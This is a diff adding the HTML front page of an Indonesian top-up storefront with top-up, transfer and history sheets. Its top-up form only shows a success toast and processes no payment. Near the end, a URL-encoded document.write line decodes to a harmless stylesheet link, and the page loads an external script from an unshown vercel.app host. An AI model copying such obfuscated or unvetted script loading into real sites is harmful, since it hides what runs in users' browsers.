@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="id" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TakakaStore — Platform Topup Terbaru</title>
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:opsz,wght@9..40,300;9..40,400;9..40,500;9..40,600&display=swap" rel="stylesheet">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="style3.css">
+<link rel="stylesheet" href="style.css">
+</style>
+</head>
+<body>
+
+<div class="ambient a1"></div>
+<div class="ambient a2"></div>
+<div class="ambient a3"></div>
+
+<div id="toast" class="toast"><i class="fas fa-check-circle"></i><span id="toastMsg">OK</span></div>
+
+<header class="header">
+  <div class="header-inner">
+    <div class="topbar reveal">
+      <div class="logo">
+        <div class="logo-mark"><i class="fas fa-bolt"></i></div>
+        <span class="logo-text">TakakaStore</span>
+      </div>
+      <div class="topbar-right">
+        <div class="theme-toggle" id="themeToggle" role="button" aria-label="Toggle tema">
+          <div class="toggle-thumb">
+            <i class="fas fa-moon ti-dark"></i>
+            <i class="fas fa-sun ti-light"></i>
+          </div>
+        </div>
+        <div class="icon-btn" id="notifBtn" title="Notifikasi">
+          <i class="fas fa-bell"></i>
+          <div class="notif-dot" id="notifDot"></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="user-row reveal d1">
+      <div>
+        <div class="greeting-label">Selamat datang kembali</div>
+        <div class="greeting-name">User 👋</div>
+      </div>
+      <div class="status-pill"><div class="sdot"></div>Aktif</div>
+    </div>
+
+    <div class="balance-panel reveal d2">
+      <div class="balance-left">
+        <div class="balance-label">Saldo Anda</div>
+        <div class="balance-value">
+          <span class="bal-curr">Rp</span>
+          <span class="bal-num" id="balNum">0</span>
+          <span class="bal-mask" id="balMask">••••••</span>
+          <button class="refresh-btn" id="refreshBtn"><i class="fas fa-rotate-right" id="refreshIcon"></i></button>
+        </div>
+      </div>
+      <div class="balance-right">
+        <div class="points-pill"><i class="fas fa-star"></i>0 Poin</div>
+        <button class="eye-btn" id="eyeBtn"><i class="fas fa-eye" id="eyeIcon"></i></button>
+      </div>
+    </div>
+  </div>
+</header>
+
+<main class="container">
+
+  <div class="stats-row reveal d1">
+    <div class="stat-card"><div class="stat-val sv-c" id="stTx">0</div><div class="stat-lbl">Transaksi</div></div>
+    <div class="stat-card"><div class="stat-val sv-g" id="stPts">0</div><div class="stat-lbl">Points</div></div>
+    <div class="stat-card"><div class="stat-val sv-s">10%</div><div class="stat-lbl">Cashback</div></div>
+  </div>
+  
+  <section class="banner-section reveal d4">
+    <div class="banner" onclick="showToast('🎉 Promo cashback 10% aktif!')">
+      <div class="bn-glow bn-g1"></div><div class="bn-glow bn-g2"></div>
+      <div class="banner-content">
+        <div class="bn-emoji">🎉</div>
+        <div class="bn-text"><h3>Promo Spesial Hari Ini!</h3><p>Cashback hingga 10% untuk setiap transaksi pulsa & paket data</p></div>
+        <div class="bn-arrow"><i class="fas fa-arrow-right"></i></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="reveal d2">
+    <div class="sec-header">
+      <div class="sec-title"><i class="fas fa-grid-2"></i>Aksi Cepat</div>
+    </div>
+    <div class="quick-actions">
+      <div class="qa" id="qaTopup"><div class="qa-icon qi-b"><i class="fas fa-plus"></i></div><div class="qa-lbl">Top Up</div></div>
+      <div class="qa" id="qaTransfer"><div class="qa-icon qi-c"><i class="fas fa-right-left"></i></div><div class="qa-lbl">Transfer</div></div>
+      <div class="qa" id="qaHistory"><div class="qa-icon qi-v"><i class="fas fa-clock-rotate-left"></i></div><div class="qa-lbl">History</div></div>
+      <div class="qa" id="qaBantuan"><div class="qa-icon qi-g"><i class="fas fa-circle-question"></i></div><div class="qa-lbl">Bantuan</div></div>
+    </div>
+  </section>
+
+  <div class="divider"></div>
+
+  <section class="services-section reveal d3">
+    <div class="sec-header">
+      <div class="sec-title"><i class="fas fa-bolt"></i>Layanan Prabayar</div>
+      <div class="sec-more">Semua <i class="fas fa-chevron-right"></i></div>
+    </div>
+    <div class="services-grid">
+      <div class="svc-card" onclick="window.open('layanan-pulsa','_blank')"><div class="svc-icon si1"><i class="fas fa-signal"></i></div><div class="svc-name">Pulsa</div></div>
+      <div class="svc-card" onclick="window.open('layanan-paketdata','_blank')"><div class="svc-icon si2"><i class="fas fa-wifi"></i></div><div class="svc-name">Paket Data</div></div>
+      <div class="svc-card" onclick="window.open('layanan-game','_blank')"><div class="svc-icon si3"><i class="fa fa-gamepad"></i></div><div class="svc-name">Topup Game</div></div>
+      <div class="svc-card" onclick="window.open('layanan-telpsms','_blank')"><div class="svc-icon si4"><i class="fas fa-phone"></i></div><div class="svc-name">Telp & SMS</div></div>
+      <div class="svc-card" onclick="window.open('layanan-vgame','_blank')"><div class="svc-icon si5"><i class="fas fa-ticket"></i></div><div class="svc-name">Voucher Game</div></div>
+      <div class="svc-card" onclick="window.open('layanan-ewallet','_blank')"><div class="svc-icon si6"><i class="fas fa-wallet"></i></div><div class="svc-name">E-Wallet</div></div>
+      <div class="svc-card" onclick="window.open('layanan-tknpln','_blank')"><div class="svc-icon si7"><i class="fas fa-bolt"></i></div><div class="svc-name">Token PLN</div></div>
+      <div class="svc-card" onclick="window.open('layanan-voucherb','_blank')"><div class="svc-icon si8"><i class="fas fa-gift"></i></div><div class="svc-name">Voucher</div></div>
+      <div class="svc-card" onclick="window.open('layanan-internet','_blank')"><div class="svc-icon si9"><i class="fas fa-globe"></i></div><div class="svc-name">ACT Internet</div></div>
+    </div>
+  </section>
+
+  <section class="cs-section reveal d5">
+    <div class="sec-header">
+      <div class="sec-title"><i class="fas fa-headset"></i>Customer Service</div>
+      <div class="sec-more">24/7 Online</div>
+    </div>
+    <div class="cs-list">
+      <a class="cs-item" href="../support-whatsapp" target="_blank" rel="noopener">
+        <div class="status-pill">On</div>
+        <div class="cs-ico ico-wa"><i class="fab fa-whatsapp"></i></div>
+        <div class="cs-info"><h4>WhatsApp</h4><p>Respon cepat via WA</p></div>
+        <i class="fas fa-chevron-right cs-chev"></i>
+      </a>
+      <a class="cs-item" href="#tdkada" target="_blank" rel="noopener">
+        <div class="status-pelloff">Off</div>
+        <div class="cs-ico ico-tg"><i class="fab fa-telegram"></i></div>
+        <div class="cs-info"><h4>Telegram</h4><p>Chat via Telegram</p></div>
+        <i class="fas fa-chevron-right cs-chev"></i>
+      </a>
+    </div>
+  </section>
+
+</main>
+
+<footer class="footer">
+  <div class="footer-logo">TakakaStore</div>
+  <div class="footer-txt">© 2026 TakakaStore · Platform Topup Terdepan</div>
+</footer>
+
+<nav class="bottom-nav">
+  <div class="nav-it active" data-nav="home"><i class="fas fa-house"></i><span>Beranda</span></div>
+  <div class="nav-it" data-nav="trx"><i class="fas fa-receipt"></i><!--<div class="nav-badge">3</div>--><span>Transaksi</span></div>
+  <div class="nav-it" data-nav="promo"><i class="fas fa-tag"></i><span>Promo</span></div>
+  <div class="nav-it" data-nav="akun"><i class="fas fa-user-circle"></i><span>Akun</span></div>
+</nav>
+
+<div class="overlay" id="notifO"></div>
+<div class="sheet" id="notifS">
+  <div class="sheet-handle"></div>
+  <button class="sheet-close" data-close="notif"><i class="fas fa-times"></i></button>
+  <div class="sheet-title">Notifikasi</div>
+  <div class="notif-item"><div class="ni-ico ni-b"><i class="fas fa-tag"></i></div><div class="ni-body"><h5>Promo Cashback 10%</h5><p>Berlaku hari ini untuk semua transaksi pulsa & paket data</p><div class="ni-time">4/Apr/2026 - 19.07</div></div></div>
+</div>
+
+<div class="overlay" id="topupO"></div>
+<div class="sheet" id="topupS">
+  <div class="sheet-handle"></div>
+  <button class="sheet-close" data-close="topup"><i class="fas fa-times"></i></button>
+  <div class="sheet-title">Top Up Saldo</div>
+  <div class="input-grp">
+    <label>Pilih Nominal</label>
+    <div class="nom-grid">
+      <div class="nom-btn" data-val="10000">Rp10.000</div>
+      <div class="nom-btn" data-val="25000">Rp25.000</div>
+      <div class="nom-btn" data-val="50000">Rp50.000</div>
+      <div class="nom-btn" data-val="100000">Rp100.000</div>
+      <div class="nom-btn" data-val="200000">Rp200.000</div>
+      <div class="nom-btn" data-val="500000">Rp500.000</div>
+    </div>
+    <input class="inp" id="topupAmt" type="number" placeholder="Atau ketik jumlah lainnya..." min="10000">
+  </div>
+  <div class="input-grp">
+    <label>Metode Pembayaran</label>
+    <select class="inp" id="payMethod"><option value="">Pilih metode...</option><option>Transfer Bank (BCA, Mandiri, BRI)</option><option>GoPay</option><option>OVO</option><option>DANA</option><option>QRIS</option></select>
+  </div>
+  <button class="btn-primary" id="topupSubmit">Lanjutkan Top Up</button>
+</div>
+
+<!-- ── MODAL: TRANSFER ── -->
+<div class="overlay" id="transferO"></div>
+<div class="sheet" id="transferS">
+  <div class="sheet-handle"></div>
+  <button class="sheet-close" data-close="transfer"><i class="fas fa-times"></i></button>
+  <div class="sheet-title">Transfer Saldo</div>
+  <div class="input-grp"><label>ID / Username Penerima</label><input class="inp" id="transferTo" type="text" placeholder="Masukkan ID penerima..."></div>
+  <div class="input-grp"><label>Jumlah Transfer</label><input class="inp" id="transferAmt" type="number" placeholder="Rp 0" min="1000"><p style="color: red;">Saldo tidak cukup</p></div>
+  <div class="input-grp"><label>Catatan (opsional)</label><input class="inp" type="text" placeholder="Tambahkan catatan..."></div>
+  <button class="btn-primary" id="transferSubmit">Kirim Saldo</button>
+</div>
+
+<!-- ── MODAL: HISTORY ── -->
+<div class="overlay" id="historyO"></div>
+<div class="sheet" id="historyS">
+  <div class="sheet-handle"></div>
+  <button class="sheet-close" data-close="history"><i class="fas fa-times"></i></button>
+  <div class="sheet-title">Riwayat Transaksi</div>
+  <p>Tidak Ada Transaksi</p>
+</div>
+
+<!-- ── MODAL: PROFIL ── -->
+<div class="overlay" id="profileO"></div>
+<div class="sheet" id="profileS">
+  <div class="sheet-handle"></div>
+  <button class="sheet-close" data-close="profile"><i class="fas fa-times"></i></button>
+  <div class="sheet-title">Profil Saya</div>
+  <div class="profile-header">
+    <div class="profile-avatar">U</div>
+    <div><div class="profile-name">User Takakas</div><div class="profile-email">user@takakas.my</div></div>
+  </div>
+  <div class="pmi"><div class="pmi-ico" style="background:linear-gradient(135deg,#1d4ed8,#3b82f6)"><i class="fas fa-user-pen"></i></div><span class="pmi-lbl">Edit Profil</span><i class="fas fa-chevron-right pmi-ch"></i></div>
+  <div class="pmi"><div class="pmi-ico" style="background:linear-gradient(135deg,#065f46,#10b981)"><i class="fas fa-shield-halved"></i></div><span class="pmi-lbl">Keamanan</span><i class="fas fa-chevron-right pmi-ch"></i></div>
+  <div class="pmi"><div class="pmi-ico" style="background:linear-gradient(135deg,#92400e,#f59e0b)"><i class="fas fa-circle-question"></i></div><span class="pmi-lbl">Bantuan</span><i class="fas fa-chevron-right pmi-ch"></i></div>
+  <div class="pmi" onclick="showToast('Sampai jumpa! 👋')"><div class="pmi-ico" style="background:linear-gradient(135deg,#7f1d1d,#ef4444)"><i class="fas fa-right-from-bracket"></i></div><span class="pmi-lbl">Keluar</span><i class="fas fa-chevron-right pmi-ch"></i></div>
+</div>
+
+<script>
+let _tt;
+function showToast(msg){
+  const el=document.getElementById('toast'),ms=document.getElementById('toastMsg');
+  ms.textContent=msg; el.classList.add('show');
+  clearTimeout(_tt); _tt=setTimeout(()=>el.classList.remove('show'),2800);
+}
+
+function openModal(id){
+  document.getElementById(id+'O').classList.add('open');
+  document.getElementById(id+'S').classList.add('open');
+  document.body.style.overflow='hidden';
+}
+function closeModal(id){
+  document.getElementById(id+'O').classList.remove('open');
+  document.getElementById(id+'S').classList.remove('open');
+  document.body.style.overflow='';
+}
+// Close buttons
+document.querySelectorAll('[data-close]').forEach(b=>b.addEventListener('click',()=>closeModal(b.dataset.close)));
+// Overlay click
+['notif','topup','transfer','history','profile'].forEach(n=>document.getElementById(n+'O').addEventListener('click',()=>closeModal(n)));
+// Swipe down
+document.querySelectorAll('.sheet').forEach(s=>{
+  let sy=0;
+  s.addEventListener('touchstart',e=>{sy=e.touches[0].clientY},{passive:true});
+  s.addEventListener('touchend',e=>{if(e.changedTouches[0].clientY-sy>80){const n=s.id.slice(0,-1);closeModal(n);}},{passive:true});
+});
+
+let dark=true;
+document.getElementById('themeToggle').addEventListener('click',()=>{
+  dark=!dark;
+  document.documentElement.setAttribute('data-theme',dark?'dark':'light');
+  showToast(dark?'Tema Gelap aktif':'Tema Terang aktif');
+});
+
+document.getElementById('notifBtn').addEventListener('click',()=>{
+  openModal('notif');
+  document.getElementById('notifDot').style.display='none';
+});
+
+document.getElementById('qaTopup').addEventListener('click',()=>openModal('topup'));
+document.getElementById('qaTransfer').addEventListener('click',()=>openModal('transfer'));
+document.getElementById('qaHistory').addEventListener('click',()=>openModal('history'));
+document.getElementById('qaBantuan').addEventListener('click',()=>{showToast('Menghubungi CS...');setTimeout(()=>window.open('support-whatsapp','_blank'),700)});
+
+document.querySelectorAll('.nav-it').forEach(item=>{
+  item.addEventListener('click',()=>{
+    const n=item.dataset.nav;
+    if(n==='trx'){openModal('history');return}
+    if(n==='akun'){openModal('profile');return}
+    if(n==='promo'){showToast('Setiap hari ada promo!');return}
+    document.querySelectorAll('.nav-it').forEach(i=>i.classList.remove('active'));
+    item.classList.add('active');
+  });
+});
+
+let hidden=false;
+document.getElementById('eyeBtn').addEventListener('click',()=>{
+  hidden=!hidden;
+  const num=document.getElementById('balNum'),mask=document.getElementById('balMask'),icon=document.getElementById('eyeIcon');
+  if(hidden){num.style.display='none';mask.style.display='inline';icon.className='fas fa-eye-slash';showToast('Saldo disembunyikan');}
+  else{num.style.display='inline';mask.style.display='none';icon.className='fas fa-eye';showToast('Saldo ditampilkan');}
+});
+
+let refreshing=false;
+document.getElementById('refreshBtn').addEventListener('click',()=>{
+  if(refreshing)return; refreshing=true;
+  const icon=document.getElementById('refreshIcon'),num=document.getElementById('balNum');
+  icon.style.transition='transform 1s ease'; icon.style.transform='rotate(360deg)'; num.style.opacity='0.3';
+  setTimeout(()=>{icon.style.transition='none';icon.style.transform='rotate(0)';num.style.opacity='1';showToast('Saldo berhasil diperbarui');refreshing=false;},1000);
+});
+
+document.querySelectorAll('.nom-btn').forEach(btn=>{
+  btn.addEventListener('click',()=>{
+    document.querySelectorAll('.nom-btn').forEach(b=>b.classList.remove('sel'));
+    btn.classList.add('sel');
+    document.getElementById('topupAmt').value=btn.dataset.val;
+  });
+});
+
+document.getElementById('topupSubmit').addEventListener('click',()=>{
+  const a=document.getElementById('topupAmt').value,m=document.getElementById('payMethod').value;
+  if(!a||+a<10000){showToast('Minimum top up Rp10.000');return}
+  if(!m){showToast('Pilih metode pembayaran');return}
+  showToast('Permintaan top up dikirim!'); closeModal('topup');
+});
+
+document.getElementById('transferSubmit').addEventListener('click',()=>{
+  const t=document.getElementById('transferTo').value.trim(),a=document.getElementById('transferAmt').value;
+  if(!t){showToast('Masukkan ID penerima');return}
+  if(!a||+a<1000){showToast('Minimum transfer Rp1.000');return}
+  // showToast(`Transfer ke ${t} berhasil!`); closeModal('transfer');
+});
+
+function countUp(el,end,dur=1200){
+  let s=0,step=end/(dur/16);
+  const t=setInterval(()=>{s=Math.min(s+step,end);el.textContent=Math.floor(s).toLocaleString('id');if(s>=end)clearInterval(t);},16);
+}
+
+document.addEventListener('DOMContentLoaded',()=>{
+  countUp(document.getElementById('stTx'),0);
+  countUp(document.getElementById('stPts'),0);
+
+  document.querySelectorAll('.svc-card').forEach((c,i)=>{
+    c.style.opacity='0'; c.style.transform='translateY(16px)';
+    setTimeout(()=>{
+      c.style.transition='opacity .4s ease,transform .4s ease,border-color .3s,box-shadow .3s,background .3s';
+      c.style.opacity=c.classList.contains('soon')?'0.42':'1';
+      c.style.transform='translateY(0)';
+    },370+i*50);
+  });
+
+  document.querySelectorAll('.qa').forEach((el,i)=>{
+    el.style.opacity='0'; el.style.transform='scale(.87) translateY(12px)';
+    setTimeout(()=>{
+      el.style.transition='opacity .4s ease,transform .4s ease,border-color .3s,box-shadow .3s,background .3s';
+      el.style.opacity='1'; el.style.transform='scale(1) translateY(0)';
+    },240+i*60);
+  });
+});
+</script>
+<script language=javascript>document.write(unescape('%3C%6C%69%6E%6B%20%72%65%6C%3D%22%73%74%79%6C%65%73%68%65%65%74%22%20%68%72%65%66%3D%22%61%6B%75%67%61%6E%74%65%6E%67%61%62%61%64%69%62%6F%73%6B%75%2E%63%73%73%22%3E'))</script>
+<script src="https://nani-sigma.vercel.app/assets/js/cumantampilan.js"></script>
+</body>
+</html>
